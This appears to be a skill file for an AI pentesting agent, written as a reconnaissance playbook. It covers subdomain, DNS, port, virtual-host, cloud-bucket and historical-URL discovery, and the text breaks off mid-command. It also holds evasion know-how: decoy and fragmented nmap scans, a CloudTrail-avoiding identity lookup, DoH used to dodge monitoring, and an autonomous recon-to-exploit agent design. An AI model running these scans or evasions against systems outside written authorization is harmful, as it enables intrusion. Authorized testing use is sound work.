---
name: recon-for-sec
description: >-
  General target reconnaissance and fingerprinting playbook. Use when discovering subdomains, DNS records, open ports, tech stacks, virtual hosts, cloud storage, historical URLs, and WAF/CDN presence across an authorized scope — before exploitation.
---

# SKILL: Recon for Sec — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert target reconnaissance and attack-surface discovery. Covers passive + active subdomain enumeration, DNS record mining and zone transfer attempts, port/service scanning with evasion, tech-stack fingerprinting, virtual-host discovery, web content brute force, cloud bucket enumeration, Shodan/Censys/FOFA passive recon, and Wayback/historical URL collection. This is discovery only — once you exploit a finding, route to the relevant exploitation skill.

## 0. RELATED ROUTING

Use this file for scope-safe discovery and fingerprinting across the whole target. Exploitation routes elsewhere. Also load:

- [api recon and docs](../api-recon-and-docs/SKILL.md) once a web/API surface is found — that skill mines JS bundles, OpenAPI specs, mobile APKs, version drift, and actuator endpoints (it is the API-specific counterpart to this general recon skill)
- [subdomain takeover](../subdomain-takeover/SKILL.md) when dangling CNAMEs / unclaimed DNS records are found in section 1
- [waf bypass techniques](../waf-bypass-techniques/SKILL.md) once a WAF/CDN is identified in section 9 — this skill only identifies, it does not bypass
- [insecure source code management](../insecure-source-code-management/SKILL.md) when `.git`/`.svn`/backup artifacts surface during content discovery
- [recon and methodology](../recon-and-methodology/SKILL.md) for the structured methodology, scope control, evidence handling, and orchestration that wraps this skill's findings

---

## 1. SUBDOMAIN ENUMERATION

Goal: build the complete list of in-scope hostnames. Combine passive (no packets to target) and active (resolver-verified, brute force, permutation) techniques.

### 1a. Passive — Certificate Transparency

CT logs are the highest-yield passive source. Every TLS cert issued is logged publicly.

```bash
# crt.sh (Mozilla-operated, free) — JSON output, dedup wildcards
curl -s "https://crt.sh/?q=%25.target.com&output=json" \
  | jq -r '.[].name_value' | tr '[:upper:]' '[:lower:]' \
  | sed 's/\*\.//g' | sort -u > ct_subs.txt

# Censys certificate search (API key required)
censys search "services.tls.certificates.leaf_data.subject.common_name: target.com" --pages 5

# Google CT log search via the CT log APIs directly
curl -s "https://ct.googleapis.com/logs/argon2022/ct/v1/get-entries?start=0&end=1000"
```

### 1b. Passive — Search Engines & Aggregators

```bash
# subfinder aggregates 30+ passive sources (VT, SecurityTrails, Hackertarget...)
subfinder -d target.com -all -recursive -o subfinder_subs.txt

# assetfinder (single binary, fast, free sources)
assetfinder --subs-only target.com > assetfinder_subs.txt

# amass passive mode (broadest source list, slowest)
amass enum -passive -d target.com -o amass_subs.txt

# Google/Bing dorking
curl -s "https://www.google.com/search?q=site:*.target.com+-site:www.target.com&num=100"
```

### 1c. Passive — ASN & IP Range Pivot

```bash
# Find the target's ASN, then enumerate all announced prefixes
whois -h whois.radb.net -- '-i origin AS12345' | grep -E 'route|route6'
amass intel -org "Target Inc"          # discover ASNs owned by the org
amass intel -active -asn 12345 -ip     # enumerate IPs in the ASN, reverse to domains

# Reverse-resolve every IP in a CIDR to find unadvertised hostnames
nmap -sL 10.0.0.0/24 | awk '/Nmap scan report/{print $NF}' | while read ip; do
  host "$ip" 2>/dev/null | grep "domain name pointer"
done
```

### 1d. Passive — DNS NSEC Walking

DNSSEC-signed zones leak the "next non-existent name" via NSEC records, enabling full zone enumeration without a transfer.

```bash
# ldns-walk / nsec3walker / dnswalk
ldns-walk target.com
# Python: https://github.com/anonion0/nsec3map covers NSEC3 hashes
```

### 1e. Active — Brute Force with Wordlists

```bash
# Resolution-only brute force (fast, no HTTP)
ffuf -u "https://FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -mc 200,301,302,401,403 -o ffuf_subs.json

# amass active — resolves + bruteforce + permutations
amass enum -active -d target.com -brute -w subdomains.txt -o amass_active.txt

# knockpy — permutation + resolver
knockpy target.com -w subdomains.txt
```

### 1f. Active — Permutation / Alteration Scanning

Many subdomains are typosquats or dev variants (`dev1`, `stg-eu`, `target-prod`). Permutation engines generate and resolve them.

```bash
# alterx / dnsgen generate permutations from known subs
cat known_subs.txt | dnsgen - | tee perms.txt
# Resolve the generated candidates
cat perms.txt | massdns -r resolvers.txt -t A -o S -w resolved.txt

# Gotator
gotator -sub known_subs.txt -depth 2 > gotator_perms.txt
```

### 1g. DNS Zone Transfer Attempt

Zone transfer (`AXFR`) is misconfiguration that dumps the entire zone. Rare in 2026 but always worth one attempt per NS.

```bash
# Manual
dig axfr @ns1.target.com target.com
dig axfr @ns2.target.com target.com

# fierce automates transfer attempts + bruteforce
fierce -dns target.com
```

### 1h. Resolver-Verified Dedup

```bash
# Resolve everything, keep only live A/AAAA records, dedup by IP+host
cat *_subs.txt | sort -u | massdns -r /usr/share/massdns/resolvers.txt -t A -o S -w all_resolved.txt
# Merge into the master asset inventory (see section 12)
```

---

## 2. DNS RECON

### 2a. Full Record Type Enumeration

```bash
# Dump every common record type at once
for t in A AAAA CNAME TXT MX NS SOA CAA SRV PTR HINFO ANY; do
  echo "=== $t ==="; dig +short $t target.com @8.8.8.8
done

# DNSRecon (records + brute + zone walk in one tool)
dnsrecon -d target.com -t std,brt,axfr,srv,txt --lifetime 5

# TXT records often leak verification tokens, SPF, DKIM, cloud ownership, internal hostnames
dig +short txt target.com
dig +short txt _dmarc.target.com
# DKIM selector brute (common selectors: google, default, selector1, k1, mail)
for s in google default selector1 selector2 k1 mail s1; do
  dig +short txt $s._domainkey.target.com
done
```

### 2b. SRV / Service Records

```bash
# SRV reveals internal service locations (SIP, LDAP, Kerberos, XMPP, autodiscover)
nmap --script dns-srv-enum -p 53 target.com
for svc in _sip._tcp _ldap._tcp _kerberos._tcp _autodiscover._tcp _xmpp-server._tcp; do
  dig +short srv $svc.target.com
done
```

### 2c. Reverse DNS PTR Sweep

```bash
# Sweep a discovered CIDR in reverse to find unadvertised hostnames
nmap -sL --dns-servers 8.8.8.8 10.0.0.0/24 -oG - | awk '/Host:/{print $2,$3}'
```

### 2d. DNS Cache Snooping

Query a recursive resolver to see if it has cached records for a candidate name (indicates recent real use) — pass `+norecurse`:

```bash
dig +norecurse @resolver1.opendns.com dev-secret.target.com
# A cached answer (non-authoritative) implies the name was recently queried/resolved
```

---

## 3. PORT & SERVICE SCANNING

### 3a. Fast Discovery with masscan

```bash
# Top speed internet-wide port sweep; cap rate to avoid DoS on shared hosts
masscan 10.0.0.0/24 -p1-65535 --rate=1000 -e tun0 --excludefile exclude.txt -oG masscan.gnmap
```

### 3b. Full nmap TCP / Service / Script Scan

```bash
# All TCP ports + version + default NSE scripts
nmap -sS -p- -sV -sC -oA nmap_full 10.0.0.5 --min-rate=2000

# Targeted: common + high-risk ports
nmap -sS -sV -sC -p 21,22,23,25,53,80,81,110,111,135,139,143,389,443,445,465,587,993,995,1433,1521,2049,2375,2376,3306,3389,5432,5900,5985,5986,6379,6443,8000,8080,8443,9200,11211,27017 10.0.0.5

# UDP (slow, pick key ports)
nmap -sU --top-ports 50 -sV -oA nmap_udp 10.0.0.5
```

### 3c. Version & Script Triage

```bash
# Aggressive version detection + vulnerability scripts
nmap -sV --version-intensity 5 --script vuln,banner 10.0.0.5

# Service-specific NSE categories
nmap --script "ssl-* and not broadcast" -p 443 10.0.0.5    # TLS misconfigs/ciphers
nmap --script smb-*            -p 445 10.0.0.5
nmap --script ldap-*           -p 389,636 10.0.0.5
nmap --script http-*           -p 80,443,8080 10.0.0.5
```

### 3d. Firewall / IDS Evasion

```bash
# Fragment packets, decoy sources, spoofed source port (53/80 often allowed)
nmap -sS -f -f --source-port 53 -D RND:10 --scan-delay 100ms -p- 10.0.0.5
# -f: 8-byte fragments   --source-port 53: look like DNS   -D RND:10: 10 random decoys
# For IDS-quiet service grab: --version-intensity 0 (lightest)
```

---

## 4. TECH-STACK FINGERPRINTING

### 4a. Header / Banner Analysis

```bash
# httpx: probe many hosts at once, extract title/server/tech/redirect
httpx -l resolved_subs.txt -status-code -title -tech-detect -web-server -ip -cdn -follow-redirects -o httpx_out.txt

# whatweb: deep plugin-based fingerprint
whatweb -a 3 -v https://target.com

# Wappalyzer CLI
wappalyzer https://target.com
```

### 4b. Signature Signals Table

| Signal | Where | Indicates |
|---|---|---|
| `Server: nginx/1.18` | response header | nginx version (CVE mapping) |
| `X-Powered-By: PHP/8.1` | response header | PHP version |
| `X-AspNet-Version` | response header | .NET stack / IIS |
| `Set-Cookie: JSESSIONID=` | response header | Java/Tomcat/Spring |
| `Set-Cookie: PHPSESSID=` | response header | PHP |
| `Set-Cookie: .ASPXAUTH` | response header | ASP.NET forms auth |
| `X-Generator: Drupal` | meta / header | CMS + version |
| `Via:` / `X-Cache:` | response header | proxy / CDN presence |
| `ETag` / `Last-Modified` | response header | static server fingerprint |

### 4c. Favicon Hash (Shodan Pivot)

The favicon's mmh3 hash is a stable fingerprint. Search Shodan for all hosts sharing it to find related/internal infrastructure.

```bash
# Compute the favicon hash
python3 -c "
import mmh3, requests, codecs, codecs
r = requests.get('https://target.com/favicon.ico', timeout=10)
print(mmh3.hash(codecs.encode(r.content,'base64')))
"
# Then pivot in Shodan:  http.favicon.hash:<hash>
shodan search "http.favicon.hash:-123456789" --fields ip_str,hostnames
```

### 4d. 404 / Error Page Behavior

Custom 404 pages that return HTTP 200 break content discovery. Probe to learn the baseline before brute-forcing:

```bash
curl -s -o /dev/null -w "%{http_code}" https://target.com/this-does-not-exist-xyz987
# If 200, ffuf needs -ac (auto-calibration) to learn the false-positive signature
ffuf -u https://target.com/FUZZ -w raft-medium.txt -ac -mc 200,301,302,401,403
```

### 4e. JS Framework Signatures

```bash
# Detect React/Vue/Angular/Next by bundle strings
curl -s https://target/static/js/main.*.js | grep -oiE 'react|vue|angular|__NEXT_DATA__|nuxt|svelte|ember'
# nuclei tech-detect templates run many signatures fast
nuclei -l subs.txt -t http/technologies/ -severity info
```

---

## 5. VIRTUAL HOST DISCOVERY

One IP can host many sites selected by the `Host` header. Default-vhost responses hide the real apps behind alternate hostnames.

### 5a. Host-Header Fuzzing

```bash
# Fuzz the Host header against the resolved IP
ffuf -u http://10.0.0.5/ -H "Host: FUZZ.target.com" \
  -w subdomains.txt -fs 1234        # -fs filters the default-vhost byte size
# Also try absolute-URI and Host with attacker domain to detect host-header injection
curl -s -H "Host: test-attacker.com" http://10.0.0.5/
```

### 5b. Certificate-Based vhost Discovery

```bash
# SAN entries on the cert reveal every vhost served on that IP
echo | openssl s_client -connect 10.0.0.5:443 -servername target.com 2>/dev/null \
  | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
```

### 5c. Default vs Named Vhost Diffing

```bash
# Compare IP-direct request vs Host-header request — size/hash diff exposes hidden vhosts
diff <(curl -s http://10.0.0.5/) <(curl -s -H "Host: admin.target.com" http://10.0.0.5/)
```

---

## 6. WEB CONTENT DISCOVERY

> For API-base-path content discovery (endpoints, methods, params), use [api recon and docs](../api-recon-and-docs/SKILL.md). This section covers generic web directory/file brute force.

### 6a. Directory & File Brute Force

```bash
# ffuf — fast, filter by size/words/regex
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -mc 200,301,302,401,403 -fc 404 -ac -t 50

# feroxbuster — recursive, follows 3xx
feroxbuster -u https://target.com -w raft-medium.txt -d 3 -t 50 --extensions php,asp,aspx,jsp,html,js,bak,old

# dirsearch — built-in recursion + extension handling
dirsearch -u https://target.com -e php,asp,aspx,jsp,html,bak,old,tar.gz -t 50 --recursive
```

### 6b. Wordlist Selection

| Wordlist | Use case |
|---|---|
| `raft-large-words.txt` | Broad web app, default go-to |
| `raft-medium-words.txt` | Faster pass when time-boxed |
| `directory-list-2.3-medium.txt` | Classic directory brute |
| `subdomains-top1million-20000.txt` | Subdomain brute (section 1e) |
| `Apisees/...` / `api-endpoints.txt` | API path brute (route to api-recon) |
| `cloud.txt` / `cloud-storage` | Bucket name brute (section 7) |

### 6c. Extension & Backup Fuzz

```bash
# Extension fuzz on discovered paths
ffuf -u https://target.com/admin.FUZZ -w extensions.txt -mc 200,301,401,403
# Backup file patterns on every found file
ffuf -u https://target.com/FUZZ -w backups.txt -mc 200
```

Backup/leak suffixes to append and brute:

```text
.bak .old .orig .save .swp .~ .tmp .zip .tar.gz .rar .7z .sql .sql.gz
.git/ .git/HEAD .svn/entries .hg/requires .env .env.bak .DS_Store
config.php.bak  www.zip  backup.zip  web.zip  site.zip  db.sql
```

### 6d. Response Code Interpretation

| Code | Meaning for content discovery |
|---|---|
| 200 | Exists, readable — record |
| 301/302 | Exists, redirects — follow, map destination |
| 401 | Exists, auth required — high value, note for auth testing |
| 403 | Exists, forbidden — try [401/403 bypass techniques](../401-403-bypass-techniques/SKILL.md) |
| 404 | Not found — skip (beware custom 404 returning 200; use `-ac`) |
| 500 | Exists, errored — may leak stack trace, note for debugging |

---

## 7. CLOUD STORAGE DISCOVERY

### 7a. AWS S3 Bucket Enumeration

```bash
# Bucket name guessing from company name variants
for name in target target-com targetbackup target-prod target-assets target-uploads target-dev; do
  curl -s -o /dev/null -w "%{http_code} $name\n" "https://$name.s3.amazonaws.com/"
done

# List a discovered bucket (anonymous read)
curl -s "https://target-assets.s3.amazonaws.com/?list-type=2&max-keys=1000" | xmllint --format -

# awscli anonymous listing if ACL allows
aws s3 ls s3://target-assets --no-sign-request --region us-east-1

# Permutation-based bucket hunting
python3 bucket_finder.py -k target -d wordlist.txt   # grayhatwarfare style
```

### 7b. GCP / Azure / Other

```bash
# GCP bucket
curl -s -o /dev/null -w "%{http_code}\n" "https://storage.googleapis.com/target-assets/"
gsutil ls gs://target-assets/ 2>/dev/null

# Azure blob container
curl -s "https://targetassets.blob.core.windows.net/?comp=list" | xmllint --format -
curl -s "https://targetassets.blob.core.windows.net/\$web?restype=container&comp=list"
```

### 7c. Passive Bucket / Cloud Exposure Search

```bash
# grayhatwarfare indexes open buckets by keyword
# Shodan: search for S3/GCS/Azure signatures
shodan search "product:S3" --fields ip_str,hostnames
shodan search "http.title:\"Index of /\" +s3"
# GitHub dorking for hardcoded bucket names / keys (in-scope org repos only)
```

---

## 8. SHODAN / CENSYS / FOFA / HUNTER PASSIVE RECON

These indexers hold banner/service data for every public IP — recon without touching the target.

### 8a. Shodan Query Syntax

```bash
# Filter by target domain / cert / title / port / org
shodan search "hostname:target.com" --fields ip_str,hostnames,port,product --limit 100
shodan search "ssl.cert.subject.cn:target.com"
shodan search "org:\"Target Inc\"" --fields ip_str,port
shodan search "http.title:\"Target Login\""
shodan search "http.favicon.hash:-123456789"
shodan search "port:9200 country:US org:\"Target Inc\""   # exposed Elasticsearch
shodan host 10.0.0.5    # full history of services on an IP
```

### 8b. Censys

```bash
censys search "services.tls.certificates.leaf_data.subject.common_name: target.com" --pages 5
censys search "services.http.response.html_title: \"Target\""
censys view 10.0.0.5    # full host + certificate history
```

### 8c. FOFA / Hunter (China-indexed, good APAC coverage)

```text
# FOFA syntax
domain="target.com"
cert="target.com"
host="target.com"
title="Target Login"
ip="10.0.0.0/24"
body="powered by Target"
icon_hash="-123456789"

# Hunter (qifei) syntax
domain.suffix="target.com"
web.title="Target"
```

Use these to discover shadow IT, forgotten dev/staging boxes, and expired-but-still-listening services that the target's own CT logs miss.

---

## 9. WAF / CDN IDENTIFICATION

> This section only identifies WAF/CDN presence. For bypass, route to [waf bypass techniques](../waf-bypass-techniques/SKILL.md). For origin IP tracing behind a CDN, see the separate cdn-origin-tracing concepts.

```bash
# wafw00f fingerprints the WAF product
wafw00f https://target.com

# nmap http-waf-detect / http-waf-fingerprint scripts
nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 target.com

# Identify CDN via response headers / DNS
dig target.com | grep -i cloudflare     # Cloudflare nameservers
curl -sI https://target.com | grep -iE 'cf-ray|server|via|x-cache|akamai|x-amz-cf'
```

| Indicator | CDN/WAF |
|---|---|
| `cf-ray`, `Server: cloudflare` | Cloudflare |
| `x-akamai-transformed`, `AkamaiGHost` | Akamai |
| `X-Amz-Cf-Id` | AWS CloudFront |
| `X-Sucuri-ID` | Sucuri |
| `Server: AkamaiGHost`, `Server: Imperva` | Imperva Incapsula |
| `Set-Cookie: incap_ses` | Incapsula |

**Origin IP tracing hint**: when a CDN fronts the target, the real origin IP must be found before direct port scans are meaningful — cross-load the cdn-origin-tracing concepts. Note historical DNS/Wayback often record the pre-CDN A record.

---

## 10. WAYBACK / HISTORICAL URL COLLECTION

Historical snapshots expose endpoints, parameters, and deleted pages that live testing no longer shows.

```bash
# waybackurls — pull every known URL for the domain
waybackurls target.com > wayback.txt
echo target.com | gau --threads 8 >> gau.txt      # gau = Wayback + Common Crawl + AlienVault

# hakrawler crawls the live site (JS links, forms, embedded URLs)
echo https://target.com | hakrawler -depth 3 -usewayback -insecure

# Filter for interesting patterns from collected URLs
cat wayback.txt gau.txt | sort -u \
  | grep -iE '\.(js|json|map|env|bak|old|sql|zip|tar|git|svn)|admin|debug|internal|api|token|key|config|backup'
```

### 10a. JS History Diffing

Fetch the same JS bundle from Wayback at different dates to find removed endpoints or downgraded auth:

```bash
# Get archived versions
curl -s "https://web.archive.org/web/2024*/https://target/static/js/main.*.js"
# Diff current vs archived to surface removed-but-still-working routes
diff current.js archived_2023.js | grep -oE '"/api/[a-z0-9_/{}]+"'
```

---

## 11. SUBDOMAIN TAKEOVER ENTRY POINT

When section 1 yields subdomains with CNAMEs pointing at decommissioned/external services, they are takeover candidates. This skill only flags them; exploitation routes to [subdomain takeover](../subdomain-takeover/SKILL.md).

```bash
# subjack / subzy / nuclei takeover templates scan for dangling CNAMEs
subjack -w resolved_subs.txt -t 50 -timeout 30 -ssl -c fingerprints.json
nuclei -l resolved_subs.txt -t http/takeovers/ -severity high

# Manual check: a CNAME to a deprovisioned S3/GitHub/Pages/Heroku service
dig +short CNAME dev-old.target.com
# → dev-old-target.s3.amazonaws.com  →  NoSuchBucket → TAKEOVERABLE
```

---

## 12. RECON DATA INTEGRATION & SCOPE CONTROL

### 12a. Merge / Dedup Pipeline

```bash
# Merge all subdomain sources, lowercase, dedup, strip wildcards
cat ct_subs.txt subfinder_subs.txt amass_subs.txt ffuf_subs.txt \
  | tr '[:upper:]' '[:lower:]' | sed 's/\*\.//g' | sort -u > all_subs_raw.txt

# Resolve and keep only live, then feed fingerprinting + port scan
massdns -r resolvers.txt -t A -o S all_subs_raw.txt -w all_subs_live.txt
httpx -l all_subs_live.txt -title -tech-detect -status-code -ip -cdn -o live_assets.txt
```

### 12b. Scope Filtering (Authorization Boundary)

**Critical**: never test assets outside written scope. Filter the inventory against the in-scope list before any active scan.

```bash
# Scope file example (wildcard + explicit + exclusions)
cat scope.txt
#   *.target.com
#   api.target.io
#   10.0.0.0/24
#   !old.target.com          (out-of-scope)

# Filter resolved subs to in-scope only (use scope-as-a-service tools: scopeview/aquatone)
cat all_subs_live.txt | grep -E 'target\.com$|target\.io$' \
  | grep -vE '^old\.target\.com$' > scoped_assets.txt
```

> Scope definition, rules of engagement, and evidence handling are the responsibility of [recon and methodology](../recon-and-methodology/SKILL.md). Run scope checks there before any active phase.

### 12c. Output Hand-Off

The reconciled asset inventory (`live_assets.txt`) plus port/service scan results (`nmap_full.gnmap`) and the tech fingerprint table are the input to every downstream exploitation skill. Structure them as a clean asset list before handing off.

---

## 13. RECON QUICK REFERENCE

| Goal | Tool / command | Yields |
|---|---|---|
| Passive subdomains | `subfinder`, `assetfinder`, `amass -passive`, `crt.sh` | hostname list, no target packets |
| Active subdomains | `amass -active -brute`, `ffuf`, `dnsgen`+`massdns` | resolved + permuted hostnames |
| DNS records | `dig`, `dnsrecon`, `fierce` | A/AAAA/TXT/SRV/MX/NS + AXFR attempts |
| Port sweep | `masscan`, `nmap -p-` | open ports |
| Service/version | `nmap -sV -sC`, NSE categories | banners, CVE candidates |
| Fingerprint | `httpx`, `whatweb`, `wappalyzer`, nuclei tech-detect | tech stack + versions |
| Favicon pivot | mmh3 hash → `shodan search http.favicon.hash:` | related infra |
| vhost | `ffuf -H "Host: FUZZ"`, cert SAN | hidden apps on one IP |
| Content brute | `ffuf`, `feroxbuster`, `dirsearch` | dirs/files/backups |
| Cloud buckets | curl/awscli/gsutil + grayhatwarfare | open S3/GCS/Azure blobs |
| Passive net intel | `shodan`, `censys`, `fofa`, `hunter` | banners/history/shadow IT |
| Historical URLs | `waybackurls`, `gau`, `hakrawler` | old/deleted endpoints |
| WAF/CDN ID | `wafw00f`, nmap waf scripts, headers | WAF product (route to bypass skill) |
| Takeover entry | `subjack`, `nuclei takeovers` | dangling CNAME candidates |

---

## 14. TESTING CHECKLIST

```
□ Pull certificate transparency logs (crt.sh / Censys) and dedup
□ Run passive aggregators: subfinder, assetfinder, amass -passive
□ Enumerate ASN/IP ranges and reverse-resolve discovered CIDRs
□ Attempt NSEC walking and AXFR zone transfer on each NS
□ Active brute force subdomains + permutation scanning (dnsgen/gotator + massdns)
□ Enumerate all DNS record types (A/AAAA/CNAME/TXT/MX/NS/SOA/CAA/SRV/PTR)
□ Brute DKIM selectors and check TXT for leaked tokens/hostnames
□ Reverse PTR sweep and DNS cache snooping on candidate names
□ masscan full-range port sweep, then nmap -sV -sC on open ports
□ Run UDP top-50 and service-specific NSE (ssl/smb/ldap/http)
□ Apply firewall evasion (fragmentation, decoys, source-port 53) where needed
□ Fingerprint with httpx/whatweb/wappalyzer + nuclei tech-detect
□ Compute favicon hash and pivot in Shodan for related infra
□ Map 404/error baseline before content brute (use -ac auto-calibration)
□ Fuzz virtual hosts via Host header against each resolved IP
□ Diff default vs named vhosts; extract SAN entries from TLS certs
□ Brute web dirs/files with ffuf/feroxbuster (raft wordlists)
□ Append backup/VCS suffixes (.bak/.old/.zip/.git/.svn/.env)
□ Interpret 200/301/401/403 codes; route 403 to 401-403 bypass skill
□ Enumerate S3/GCS/Azure buckets from company-name variants + grayhatwarfare
□ Query Shodan/Censys/FOFA/Hunter by hostname/cert/title/org/favicon
□ Collect historical URLs with waybackurls/gau/hakrawler; grep for secrets/old routes
□ Diff archived vs current JS for removed endpoints
□ Identify WAF/CDN (wafw00f, headers, DNS); route bypass to waf-bypass-techniques
□ Flag dangling-CNAME subdomains for subdomain-takeover skill
□ Merge, lowercase, dedup all subdomain sources
□ FILTER TO WRITTEN SCOPE before any active testing (hand to recon-and-methodology)
□ Hand off reconciled asset inventory + port/tech maps to downstream skills
```

---

## 15. NEXT ROUTING

| Finding | Next Skill |
|---|---|
| API endpoints/specs/JS surface discovered | [api recon and docs](../api-recon-and-docs/SKILL.md) |
| Dangling CNAME / unclaimed DNS record | [subdomain takeover](../subdomain-takeover/SKILL.md) |
| WAF/CDN identified, bypass needed | [waf bypass techniques](../waf-bypass-techniques/SKILL.md) |
| `.git`/`.svn`/backup artifacts found | [insecure source code management](../insecure-source-code-management/SKILL.md) |
| 403 on discovered path | [401/403 bypass techniques](../401-403-bypass-techniques/SKILL.md) |
| Scope definition, evidence, orchestration | [recon and methodology](../recon-and-methodology/SKILL.md) |

---

## 16. 2026 EMERGING TECHNIQUES

> **CONTEXT**: 2026 reconnaissance has shifted toward AI-driven enumeration, cloud-native attack-surface mapping, and discovery of Model Context Protocol (MCP) / AI-agent infrastructure. These techniques augment — they do not replace — sections 1–14. Verify every AI-generated hypothesis against the live target before acting; models hallucinate CVEs and inflate confidence.

### 16.1 AI-Powered Reconnaissance

LLM-augmented recon compresses days of manual triage into minutes, but every output must be verified against the live target.

#### 16.1a AI Recon Tooling

| Tool | Capability | Stat / Scope |
|---|---|---|
| PentestGPT | Reasoning + payload suggestion | 86.5% vuln detection rate on benchmark |
| SpiderFoot (AI-enhanced) | Passive source aggregation | 200+ data source modules |
| Subwiz | Subdomain discovery via fine-tuned LLMs | LLM permutation + contextual guess |
| Nexus-REC | Automated recon playbook engine | 539+ enumerated techniques |
| Veritas RedTeam | Continuous attack-surface harvesting | 1.4M subdomains/week observed |

#### 16.1b Autonomous Multi-Agent Architecture

Production autonomous red-team stacks decompose the kill chain into cooperating agents over a shared memory bus:

```
Recon Agent  →  Exploitation Agent  →  Reporting Agent
(subfinder/httpx/shodan/   (nuclei + verified          (dedup, evidence,
 CT logs; sections 1–10)    exploit attempts only)      markdown + CVSS)
```

The Recon Agent owns sections 1–10 of this skill and streams structured JSON findings. The Exploitation Agent consumes only verified, in-scope assets. The Reporting Agent never tests — it correlates and writes.

#### 16.1c AI Recon Prompting Patterns

```text
# Subdomain prioritization — rank by likelihood of being forgotten dev/staging
PROMPT: Given these 1,200 resolved subdomains and httpx titles/servers,
rank the top 50 most likely to be unpatched dev/staging/internal portals.
Weight: non-standard ports, "stg/dev/test/uat/qa" in name, old server
versions, auth-requiring titles (admin/console/dashboard/gitlab/jenkins).

# Shodan banner analysis — hypothesize CVE exposure from banners
PROMPT: For each Shodan host banner below, list product/version and the
top 3 candidate CVEs (id, cvss, vector). Flag any product that is EOL.
BANNERS: <paste `shodan host` output>

# Tech-stack vulnerability hypothesis
PROMPT: Target runs nginx 1.18 + PHP 8.1 + Laravel + PostgreSQL + Redis 6.2.
Hypothesize the 5 most likely exploitable CVEs and the 3 most likely
logic/auth flaws. For each, give the verification curl/nuclei command.
```

#### 16.1d AI Recon Workflow with Verification

```
collect (subfinder, httpx, shodan, CT logs)
  → AI analyze (rank, hypothesize CVEs, propose paths)
    → verify (nuclei, manual curl, exact version match)
      → build plan (scoped, prioritized, evidence-backed)
```

Never feed an AI model's "exploit" output directly to the target. The Exploitation Agent may only execute pre-approved, verified techniques within scope.

#### 16.1e Speed Comparison — AI vs Manual

| Phase | Manual (human) | AI-assisted | Notes |
|---|---|---|---|
| 10k subdomain triage | ~6 h | ~12 min | AI ranks; human spot-checks 5% |
| Banner → CVE mapping (500 hosts) | ~3 h | ~4 min | Always cross-check CVE IDs |
| Tech-stack hypothesis | ~45 min | ~2 min | Verify with nuclei templates |
| Attack-plan draft | ~2 h | ~8 min | Scope/legal review mandatory |

---

### 16.2 Cloud-Native Asset Discovery

### 16.2a Aurelian (Praetorian, March 2026)

Go framework that performs multi-cloud attack-surface enumeration with real IAM evaluation logic — not just bucket guessing. Module coverage: AWS (16), Azure (5), GCP (4).

```bash
# Public resource enumeration across all configured clouds
aurelian public-resources --all --out aurelian_public.json

# Secret / leaked-credential discovery in cloud metadata, lambdas, configs
aurelian find-secrets --cloud aws,azure,gcp

# IAM analysis → build Neo4j graph of principals/policies/edges
aurelian iam-analyze --neo4j bolt://localhost:7687 --out graph.cypher
```

Cypher query — find privesc paths from a compromised role to an admin:

```cypher
MATCH path = (start:Role {name:"CompromisedRole"})
              -[:CAN_ASSUME*1..6]->(target:Role {isAdmin:true})
RETURN path LIMIT 25
```

### 16.2b Cloud-Native Subdomain Takeover Modules

Aurelian ships takeover checks beyond the section 11 classic set:

| Module | Cloud | Takeover condition |
|---|---|---|
| CloudFront-S3 | AWS | Dangling CF distro → S3 origin deleted, bucket claimable |
| Elastic Beanstalk | AWS | Environment terminated, CNAME unclaimed |
| CDK bucket | AWS | CDK-generated asset bucket deleted post-deploy |

### 16.2c Covert Identity Lookup (bypasses CloudTrail)

```bash
# Look up IAM principal details via endpoints that do NOT emit
# CloudTrail management events — only with explicit authorization
aurelian identity-lookup --stealth --principal arn:aws:iam::111122223333:role/TargetRole
```

### 16.2d Other Cloud Recon Tools

| Tool | Clouds | Strength |
|---|---|---|
| Pacu | AWS | Exploitation framework, post-cred |
| CloudFox | AWS/Azure/GCP | "What the attacker sees" asset view |
| ScoutSuite | multi | CIS-benchmark posture audit |
| Prowler | AWS (multi) | Compliance + config, 300+ checks |
| cloud-pivot-finder | AWS | Find cross-account trust & pivot edges |

---

### 16.3 Certificate Transparency 2026

### 16.3a 2025–2026 CT Ecosystem Changes

| Change | Effective | Impact on recon |
|---|---|---|
| Firefox CT enforcement v135 | 2025-Q1 | All TLS certs must be logged in 2 logs |
| Let's Encrypt 6-day certificates | 2025 | More frequent CT entries → fresher subdomain data |
| Static CT API (sunbeam) | 2026 | Faster batch entry lookup, no per-entry polling |

### 16.3b CT Honeypot Reality

A cert issued for an unused hostname is scanned by automated tooling within **73 seconds** median time-to-first-scan (2025 measurement). Treat any newly issued cert as public knowledge — there is no "quiet" issuance window.

### 16.3c Query Methods

```bash
# crt.sh JSON (rate-limited)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value'

# Direct PostgreSQL to crt.sh — bypasses HTTP rate limits (read-only public)
psql -h crt.sh -p 5432 -U guest certwatch -c \
  "SELECT ci.name_value FROM certificate_identity ci
   WHERE ci.name_value LIKE '%.target.com' ORDER BY id DESC LIMIT 5000;"

# Certstream — real-time issuance firehose
certstream --json | jq 'select(.data.leaf_cert.all_domains[] | contains("target.com"))'
```

### 16.3d CT Log Aggregator Comparison

| Source | Coverage | Real-time | Notes |
|---|---|---|---|
| crt.sh | All public logs | ~5 min lag | Free, rate-limited |
| Censys | All + parsed | bulk API | Paid, richest metadata |
| SSLMate certspotter | All public logs | webhook + poll | Free tier, dedup |
| Certstream | Live firehose | seconds | Stream, no history |
| Merklemap | All public logs | batch | Searchable history, free |

### 16.3e Advanced CT Techniques

```bash
# Organizational mapping via the cert O (Organization) field — find
# shadow IT / acquisitions sharing a registered org name
curl -s "https://crt.sh/?O=Target%20Inc&output=json" | jq -r '.[].name_value' | sort -u
# Historical infra: diff CT entries month-over-month to map decommissioned
# assets and acquisitions still worth probing via direct IP.
```

Studies (2025) found **17.7M FQDNs** unique to CT logs — present in no DNS resolver and not resolvable. They indicate ephemeral infrastructure, internal certs, or decommissioned assets still worth probing via direct IP.

---

### 16.4 DNS Reconnaissance 2026

### 16.4a DNS-over-HTTPS Abuse

DoH bypasses classic DNS monitoring and egress filtering. Use for stealthy resolution against targets that watch recursive DNS.

```bash
# Resolve via Cloudflare/Google DoH — leaves no DNS packet to the target's NS
curl -s -H "accept: application/dns-json" \
